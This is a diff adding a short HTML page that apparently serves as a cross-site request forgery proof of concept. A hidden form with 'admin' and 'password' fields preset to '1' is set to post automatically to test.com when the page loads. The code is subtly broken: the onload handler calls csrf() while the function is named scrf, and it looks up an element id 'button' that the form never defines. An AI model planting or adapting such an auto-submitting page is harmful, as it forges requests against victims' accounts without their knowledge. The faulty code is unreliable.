@@ -1,0 +1,18 @@
+<body onload="javascript:csrf()">
+<script type="text/javascript">
+    function scrf () {
+        document.getElementById('button').click();
+    }
+</script>
+
+<style type="text/css">
+    form
+    {
+        display: none;
+    }
+</style>
+<form action="http://test.com" method="post">
+<input name="admin" type="text" size="30" value="1">
+<input name="password" type="text" size="30" value="1">
+<input name="button" type="submit" value="提交数据">
+</form>
